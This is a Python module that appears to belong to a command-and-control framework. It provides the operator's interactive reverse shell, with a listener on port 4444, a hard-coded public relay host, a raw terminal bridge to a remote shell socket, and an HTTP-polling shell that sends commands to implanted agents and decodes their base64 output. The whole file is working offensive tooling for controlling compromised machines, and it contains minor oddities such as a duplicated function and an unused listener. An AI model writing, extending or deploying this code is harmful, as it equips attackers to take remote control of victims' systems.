import base64
import socket
import pty
import os
import select
import signal
import sys
import time
import re
import tty
import termios
import struct
import fcntl
import secrets
from colorama import Fore, Style

RS_PORT = 4444
PUBLIC_RS = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _pty_bridge(conn):
    addr = conn.getpeername()
    _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
    _write(f"{Fore.YELLOW}[*] Real shell. Type 'exit' to return.{Style.RESET_ALL}\n")

    old = termios.tcgetattr(0)
    conn.setblocking(True)

    try:
        tty.setraw(0)
        signal.signal(signal.SIGINT, signal.SIG_IGN)

        while True:
            r, _, _ = select.select([conn, 0], [], [])
            if conn in r:
                d = conn.recv(4096)
                if not d:
                    break
                os.write(1, d)
            if 0 in r:
                d = os.read(0, 4096)
                if not d:
                    break
                conn.send(d)
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except OSError:
        pass
    except Exception as e:
        _write(f"{Fore.RED}[!] {e}{Style.RESET_ALL}\n")
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            conn.close()
        except OSError:
            pass
        _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")


def _send_task(manager, agent_id, cmd, label):
    tid = manager.send_task(agent_id, "shell", {"command": cmd})
    if tid:
        _write(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}\n")
        return tid
    return None


def revshell(manager, agent_id, c2_server):
    port = RS_PORT

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(5)
    except OSError:
        # TCP listener failed, use fast HTTP polling
        _write(f"{Fore.YELLOW}[!] Port {port} busy, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
        _fast_http_shell(manager, agent_id)
        return

    _write(f"{Fore.CYAN}[*] Starting shell via HTTP (fast polling){Style.RESET_ALL}\n")
    _fast_http_shell(manager, agent_id)


def _fast_http_shell(manager, agent_id):
    _write(f"{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}\n")

    cmd = "echo __C2_READY__"
    tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})

    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            out = r.get("output", "")
            if r.get("task_id") == tid:
                prompt = out.replace("__C2_READY__\r\n", "").replace("__C2_READY__\n", "").replace("__C2_READY__", "").strip()
                if prompt:
                    _write(prompt + " ")
                break
        else:
            continue
        break
    else:
        _write("[!] Shell init failed\n")
        return

    while True:
        try:
            cmd = input()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd.strip()})
        if not tid:
            break

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    # Strip echoed command from output
                    lines = out.split("\n")
                    if lines and lines[0].strip() == cmd.strip():
                        out = "\n".join(lines[1:])
                    if out.rstrip():
                        _write(out if out.endswith("\n") else out + "\n")
                    break
            else:
                continue
            break

        for _ in range(4):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        if data.strip():
                            _write(data)
                    except Exception:
                        pass
